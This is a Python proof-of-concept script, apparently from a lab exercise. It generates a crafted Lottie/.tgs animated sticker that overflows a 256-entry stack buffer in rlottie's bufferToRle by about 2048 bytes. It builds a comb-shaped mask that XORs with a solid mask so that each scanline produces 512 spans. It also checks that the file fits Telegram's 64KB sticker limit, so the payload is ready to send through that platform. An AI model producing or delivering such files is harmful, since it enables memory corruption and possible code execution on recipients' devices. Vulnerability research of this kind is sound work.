#!/usr/bin/env python3
"""
lab1/gen_poc_v4.py
Generate a 512x512 Lottie/.tgs sticker that overflows bufferToRle by ~256 spans.

Key difference from v3:
  v3: 2x layer scale, 512 teeth × 0.5 unit → only 256 teeth visible → 256 spans → no overflow
  v4: 1x layer scale, 512 teeth × 0.5 unit → all 512 teeth visible
      Rendered to 1024×1024 surface → 0.5 canvas unit = 1 render pixel → clean transitions
      → 512 spans per scanline → overflow of 256 spans = 2048 bytes

The XOR of a solid mask with the comb mask produces [0,255,0,255,...] across
1024 render pixels, generating 512 non-zero runs in bufferToRle.
"""

import argparse
import gzip
import io
import json
import sys


def make_rect_path(x0, y0, x1, y1):
    """Closed Lottie bezier rectangle."""
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def make_comb_path(width, height, n_teeth):
    """
    Comb polygon: n_teeth teeth, each 0.5 units wide with 0.5-unit gaps.
    Total horizontal extent = n_teeth * 1.0 units.

    At 1x layer scale, rendered to 2x surface resolution:
      - 0.5 canvas unit = 1 render pixel
      - Each tooth: 1px rendered, each gap: 1px rendered
      - 512 teeth across 512 canvas units → 1024 render pixels
      - Produces alternating [0,255,0,255,...] → 512 spans
    """
    H = float(height)
    verts = []

    for k in range(n_teeth):
        x_base = float(k)         # integer position
        x_mid  = x_base + 0.5     # half-unit offset

        # Tooth: from x_base to x_mid at y=0 (top)
        # Gap: from x_mid to x_base+1 at y=H (bottom)
        verts.append([x_base, 0.0])
        verts.append([x_mid,  0.0])
        verts.append([x_mid,  H])
        verts.append([float(k + 1), H])

    verts.append([float(n_teeth), H])
    verts.append([0.0, H])

    n = len(verts)
    zeros = [[0.0, 0.0]] * n
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def build_lottie(canvas_w, canvas_h, n_teeth):
    """Build Lottie JSON with NO layer scale (1x)."""
    solid_path = make_rect_path(0, 0, canvas_w, canvas_h)
    comb_path  = make_comb_path(canvas_w, canvas_h, n_teeth)

    def static_path(p):
        return {"a": 0, "k": p}

    def static_val(v):
        return {"a": 0, "k": v}

    # Identity transform — no scaling
    identity_ks = {
        "p": static_val([0, 0, 0]),
        "a": static_val([0, 0, 0]),
        "s": static_val([100, 100, 100]),   # 100% = 1x scale
        "r": static_val(0),
        "o": static_val(100),
    }

    layer = {
        "ty": 4,
        "nm": "OverflowV4",
        "ind": 1,
        "st": 0,
        "ip": 0,
        "op": 2,
        "sr": 1,
        "ks": identity_ks,
        "hasMask": True,
        "masksProperties": [
            {
                "mode": "a",          # Add: solid rect → base coverage
                "inv": False,
                "pt": static_path(solid_path),
                "o": static_val(100),
            },
            {
                "mode": "f",          # Difference (XOR): comb pattern
                "inv": False,
                "pt": static_path(comb_path),
                "o": static_val(100),
            },
        ],
        "shapes": [
            {
                "ty": "gr",
                "nm": "G",
                "it": [
                    {
                        "ty": "rc",
                        "nm": "Rect",
                        "p": static_val([canvas_w / 2, canvas_h / 2]),
                        "s": static_val([canvas_w, canvas_h]),
                        "r": static_val(0),
                    },
                    {
                        "ty": "fl",
                        "nm": "Fill",
                        "c": static_val([1, 0, 0, 1]),
                        "o": static_val(100),
                        "r": 1,
                    },
                ],
            }
        ],
    }

    return {
        "v": "5.5.2",
        "fr": 60,
        "ip": 0,
        "op": 2,
        "w": canvas_w,
        "h": canvas_h,
        "nm": "rlottie-overflow-v4",
        "ddd": 0,
        "assets": [],
        "layers": [layer],
    }


def main():
    ap = argparse.ArgumentParser(
        description="Generate rlottie stack-overflow PoC v4 (1x scale, 2x render)")
    ap.add_argument("--out", default="poc_v4.tgs", help="Output .tgs path")
    ap.add_argument("--json", default="poc_v4.json", help="Output JSON path")
    ap.add_argument("--teeth", type=int, default=512)
    ap.add_argument("--width", type=int, default=512)
    ap.add_argument("--height", type=int, default=512)
    args = ap.parse_args()

    render_w = args.width * 2   # rendered at 2x → 0.5 canvas unit = 1 render pixel

    print(f"Canvas:            {args.width} x {args.height}")
    print(f"Layer scale:       1x (no transform)")
    print(f"Render surface:    {render_w} x {args.height * 2} (2x for clean pixel mapping)")
    print(f"Comb teeth:        {args.teeth} (0.5 units each)")
    print(f"Teeth per pixel:   0.5 canvas unit = 1 render pixel")
    print(f"Expected spans:    {args.teeth}")
    print(f"temp[] capacity:   256")
    print(f"Expected overflow: {max(0, args.teeth - 256)} spans = "
          f"{max(0, args.teeth - 256) * 8} bytes")
    print()

    lottie = build_lottie(args.width, args.height, args.teeth)
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode("utf-8")

    with open(args.json, "wb") as f:
        f.write(json_bytes)
    print(f"[+] JSON:  {args.json}  ({len(json_bytes):,} bytes)")

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(args.out, "wb") as f:
        f.write(tgs_bytes)
    print(f"[+] TGS:   {args.out}  ({len(tgs_bytes):,} bytes)")

    if len(tgs_bytes) > 64 * 1024:
        print(f"\n[FAIL] TGS size {len(tgs_bytes)} exceeds 64KB Telegram limit!")
    else:
        print(f"\n[ok] Passes Telegram 64KB limit ({len(tgs_bytes)} < 65536 bytes)")


if __name__ == "__main__":
    main()
